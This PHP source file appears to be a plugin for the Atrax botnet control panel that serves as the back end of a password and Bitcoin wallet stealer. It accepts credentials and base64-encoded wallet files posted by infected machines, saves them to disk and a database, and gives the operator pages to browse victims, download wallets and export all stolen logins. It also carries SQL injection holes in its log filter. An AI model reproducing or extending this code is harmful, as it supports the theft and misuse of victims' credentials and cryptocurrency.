<?php

class main
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    /*
     * Run plugin
     */
    public function run()
    {

        define('BITCOIN_WALLET_STEALER_TYPE', 24);   

        if( !empty( $_POST['logs_filter'] )) {
            $_SESSION['logs_filter'] = $_POST['logs_filter'];
        }

        if( isset( $_POST['logs_filter_submit']) && empty( $_POST['logs_filter'] ))
            unset( $_SESSION['logs_filter'] );

        if( !empty( $_POST['logs_select'] )) {
            $_SESSION['logs_select'] = $_POST['logs_select'];
        }

        if( isset( $_POST['logs_filter_submit'] ) && empty( $_POST['logs_select'] ))
            unset( $_SESSION['logs_select'] );

        if( isset( $_POST['logs_filter_reset'] )) {
            unset( $_SESSION['logs_filter'] );
            unset( $_SESSION['logs_select'] );
        } 

        if( !empty( $_SESSION['logs_filter'] ) || !empty( $_SESSION['logs_select'] ))
        {
            if( !empty( $_SESSION['logs_filter'] ))
			{
							if (stristr($_SESSION['logs_filter'], 'GUID = UNHEX(') != FALSE)
				{
					$filter = 'WHERE ' . $_SESSION['logs_filter'];
				}
				else
				{
                $filter = $this->parseFilter( $_SESSION['logs_filter'] );
				}
				
			}
            if( !empty( $_SESSION['logs_select'] )) {
                if( !isset( $filter ) || trim($filter) == "WHERE" )
                    $filter = "WHERE `typeId` = '".$_SESSION['logs_select']."'";
                else
                    $filter .= " AND `typeId` = '".$_SESSION['logs_select']."'";
            }
            if( trim($filter) == "WHERE" )
                unset( $filter );
        }


        if (isset($_POST['logs_export_all'])) {
            $this->MySQL->doQuery('SELECT HEX(GUID) as GUIDString,typename,host,username,creationDate,password FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_stealer_type` ON `typeId` = `fkTypeId` '.(isset($filter) ? $filter : '').'');

            if ($this->MySQL->numResult()) {
                $today = date("Ymd");
                header('Content-Type: text/plain');
                header('Content-Disposition: Attachment; filename=atrax_stealer_logs_' . $today . '.txt');
                header('Pragma: no-cache');

                $i = 0;
                while ($pwgrabber = $this->MySQL->arrayResult()) {
					echo 'HWID:' . "\t\t" . $pwgrabber['GUIDString'] . "\r\n";
                    echo 'Type:' . "\t\t" . $pwgrabber['typename'] . "\r\n";
                    echo 'Host:' . "\t\t" . $pwgrabber['host'] . "\r\n";
                    echo 'Login:' . "\t\t" . $pwgrabber['username'] . ':' . $pwgrabber['password'] . "\r\n";
                    echo 'Created:' . "\t" . $pwgrabber['creationDate'] . "\r\n";
                    echo '=====================================' . "\r\n\r\n";

                    $i++;
                }

                die('');
            }
        }

        if(isset($_POST['logs_delete_all'])) {
            $this->MySQL->doQuery('DELETE FROM `plugin_' . $this->PluginName . '`');
        }

        if( isset( $_POST['log_id'] )) {
            $this->MySQL->doQuery("DELETE FROM `plugin_" . $this->PluginName . "` WHERE ID = '".(int) $_POST['log_id']."'");
        }



        $this->MySQL->doQuery('SELECT typename, typeId FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_stealer_type` ON `typeId` = `fkTypeId` GROUP BY `typeId`');
        $options = '<option value="0"><i>Please select...</i></option>';
        while( $t = $this->MySQL->arrayResult() ) {
            $saved = isset($_SESSION['logs_select']) ? $_SESSION['logs_select'] : 0;
            $selected = ( $t['typeId'] == $saved ) ? ' selected' : '';
            $options .= '<option value="'.$t['typeId'].'"'.$selected.'>'.$t['typename'].'</option>';
        }

        $menu = '<form name="frmStealerMenu" method="POST" action="">';
        $menu .= '<div class="stealer_menu">';
        $menu .= '<span class="buttons" style="float: left; width: 75%;">';
        $menu .= '<select name="logs_select" style="width: 20%; margin-right: 10px; padding: 5px;">'.$options.'</select>';
        $menu .= '<input type="text" name="logs_filter" style="width: 50%; padding: 6px; margin-right: 10px;" value="'.(isset($_SESSION['logs_filter']) ? $_SESSION['logs_filter'] : '').'" />';
        $menu .= '<input class="btnyellow" type="submit" name="logs_filter_submit" value="Filter Logs" />  ';
        $menu .= '<input class="btnyellow" type="submit" name="logs_filter_reset" value="Reset Filter" />';
        $menu .= '</span>';
        $menu .= '<span class="buttons" style="float:right;">';
        $menu .= '<input class="btnred" type="submit" name="logs_delete_all" value="Delete All Logs" onclick="return confirm(\'Are you sure you want to delete all stealer logs?\');" />  ';
        $menu .= '<input class="btngreen" type="submit" name="logs_export_all" value="Export All Logs" />';
        $menu .= '</span>';
        $menu .= '</div>';
        $menu .= '</form>';
        $code = $menu . '<table id="tablecss"><tr><th>Type</th><th>Hostname</th><th>Username</th><th>Password</th><th>Creation Date</th><th>Action</th></tr>';

        $page = (isset($_GET['page']) && $_GET['page'] > 0) ? ((int) $_GET['page']) : 1;
        $this->MySQL->doQuery('SELECT ID, HEX(GUID) as GUIDString,fkTypeId,typename,host,username,creationDate,password FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_stealer_type` ON `typeId` = `fkTypeId` '.(isset($filter) ? $filter : '').' LIMIT '.($page-1)*PERPAGE.','.PERPAGE);
        $i = 0;
        while ($pwgrabber = $this->MySQL->arrayResult()) {
            foreach ($pwgrabber as $key => $value) {
                $task[$key] = htmlentities($pwgrabber[$key]);
            }

            $class = ($i % 2) ? 'alt' : '';
            $code .= '<tr class="' . $class . '"><td>'.(file_exists('./images/types/'.strtolower(str_replace(' ', '_', $pwgrabber['typename'].'.png'))) ? '<img src="./images/types/'.strtolower(str_replace(' ', '_', $pwgrabber['typename'])).'.png" />' : '').' ' . $pwgrabber['typename'] . '</td><td>' . $pwgrabber['host'] . '</td><td>' . $pwgrabber['username'] . '</td><td>' . $pwgrabber['password'] . '</td><td>' . $pwgrabber['creationDate'] . '</td>';

            if ($pwgrabber['fkTypeId'] == BITCOIN_WALLET_STEALER_TYPE && strstr($pwgrabber['password'], 'Cannot write ') == FALSE) {
                $code .= '<td><a href="?action=bots&view='.$pwgrabber['GUIDString'].'"><img src="./images/other/monitor.png" title="View Victim" /></a> <form action="" method="post" style="display: inline;"><input type="hidden" name="log_id" value="'.$pwgrabber['ID'].'" /> <input type="image" src="./images/other/del.png" name="log_delete" title="Delete" onclick="return confirm(\'Are you sure you want to delete this stealer log?\');" /></form> &nbsp;<a href="'.'plugins/atraxstealer/wallet/'. $pwgrabber['username'].'"><img src="./images/other/disk.png" title="Download" /></a></td>';
            }
            else
            {
                $code .= '<td><a href="?action=bots&view='.$pwgrabber['GUIDString'].'"><img src="./images/other/monitor.png" title="View Victim" /></a> <form action="" method="post" style="display: inline;"><input type="hidden" name="log_id" value="'.$pwgrabber['ID'].'" /> <input type="image" src="./images/other/del.png" name="log_delete" title="Delete" onclick="return confirm(\'Are you sure you want to delete this stealer log?\');" /></form></td>';
            }
            $code .= '</tr>';
            $i++;
        }

        $code .= '</table>';

        $this->MySQL->doQuery('SELECT id FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_stealer_type` ON `typeId` = `fkTypeId` '.(isset($filter) ? $filter : '').'');
        $pages = ceil($this->MySQL->numResult()/PERPAGE);
        $links = array();
        $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page=1">&laquo;</a> ';
        $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page > 1 ? ($page-1) : 1).'"><</a> ';
        for($i=PREVPAGE;$i>=1;$i--)
            if( ($page - $i) > 0 )
                $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page-$i).'">'.($page-$i).'</a> ';
        $links[] = '<b>'.$page.'</b> ';
        for($i=1;$i<=PREVPAGE;$i++)
            if( ($page + $i) <= $pages )
                $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page+$i).'">'.($page+$i).'</a> ';
        $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page < $pages ? ($page+1) : $pages).'">></a> ';
        $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.$pages.'">&raquo;</a>';

        $code .= '<div style="width: 100%; text-align: center; margin-top: 10px;">';
        foreach( $links as $l=>$v )
            $code .= $v;
        $code .= '</div>';
        

        return $code;
    }

    /*
     * Insert data
     */

    public function insertData()
    {

        define('BITCOIN_WALLET_STEALER_TYPE', 24);

        if (isset($_POST["ai"]) == TRUE and isset($_POST["ab"]) == TRUE) {
            //Get post data
			
			$host  = isset($_POST['am']) ? $_POST['am'] : '';
			$username  = isset($_POST['ad']) ? $_POST['ad'] : '';
            $data = array('guid' => $_POST[POST_PARAM_GUID], 'host' => $host, 'username' => $username, 'password' => $_POST['ab'], 'fkTypeId' => $_POST['ai']);

            //Security
            foreach ($data as $key => $value) {
                $data[$key] = $this->MySQL->escapeString($data[$key]);
            }

            $typeId = intval($data['fkTypeId'], 16);

            if ($typeId == BITCOIN_WALLET_STEALER_TYPE)
            {
                $walletdata = base64_decode($data['password']);
                $outputPath = dirname(__FILE__).'/wallet/' . $data['username']; //md5 hash of wallet

                $f = @fopen($outputPath, 'w');
                if ($f) {
                    fwrite($f, $walletdata);
                    fclose($f);
                    $data['password'] = '/wallet/' . $data['username'];
                } else {
                    $data['password'] = 'Cannot write ' . $outputPath;
                }
            }

            //Insert data
            $this->MySQL->doQuery('INSERT IGNORE INTO `plugin_' . $this->PluginName . '` (`GUID`, `fkTypeId`, `host`, `username`, `password`, `creationDate`) VALUES (UNHEX(\'' . $data['guid'] . '\'), \'' . $typeId . '\', \'' . $data['host'] . '\', \'' . $data['username'] . '\', \'' . $data['password'] . '\', NOW())');
        }
    }

    /*
     * parse Filter
     */

    public function parseFilter( $string )
    {
        ## String to lower
        $string = strtolower( $string );

        ## Replace special fields
        $string = preg_replace("/type\=|browser\=/", "typename=", $string);
        $string = preg_replace("/hostname\=/", "host=", $string);
        $string = preg_replace("/guid\=/", "GUID=", $string);
        $string = preg_replace("/id\=/", "ID=", $string);

        ## Split Filter String
        $parts = preg_split("/\&|\||\=/", $string);

        ## Add active pattern between each split
        $c = 0;
        $w = array();
        foreach( $parts as $p )
        {
            $c += strlen($p);
            $w[] = $p;
            if( strlen($string) > $c )
                $w[] = $string{$c};
            $c++;
        }
        
        ## Get possible field names
        $this->MySQL->doQuery('SELECT * FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_stealer_type` ON `typeId` = `fkTypeId` LIMIT 1');
        $data = $this->MySQL->arrayResult();
        
        ## Create Query String
        $lastfield = NULL;
        $query = "WHERE ";
        for($i=0;$i<count($w);$i++)
        {
            if( count($w) < 3 )
                break;
            if( $w[$i] == "=" )
                continue;
            if( isset( $w[$i+1]) && $w[$i+1] == "=" ) {
                if( array_key_exists($w[$i], $data)) {
                    $query .= "( `".$w[$i]."` LIKE ";
                    $lastfield = $w[$i];
                }
                else {
                    if( trim($query) != "WHERE" )
                    {
                        $x = 1;
                        while( substr($query, -$x, 1) != "'")
                            $x++;
                        $query = substr( $query, 0, (strlen($query)-($x-3)) );
                        if( isset( $w[$i+3] )) {
                            while( $w[$i+3] != "=" ) {
                                if( isset( $w[$i+4] ))
                                    $i++;
                                else {
                                    $i = count($w);
                                    break;
                                }
                            }
                        }
                        else
                            $i = count($w);
                    }
                    else
                        $i = count($w);
                }
            }
            elseif( $w[$i] == "&" )
                $query .= "AND ";
            elseif( $w[$i] == "|" )
                $query .= "OR ";
            elseif( isset($w[$i-1]) && $w[$i-1] != "=" ) {
                if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                    $query .= "`".$lastfield."` LIKE '%".trim(htmlentities($w[$i]))."%') ";
                else
                    $query .= "`".$lastfield."` LIKE '%".trim(htmlentities($w[$i]))."%' ";
            }
            else {
                if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                    $query .= "'%".trim(htmlentities($w[$i]))."%') ";
                else
                    $query .= "'%".trim(htmlentities($w[$i]))."%' ";
            }
        }

        return $query;
    }
}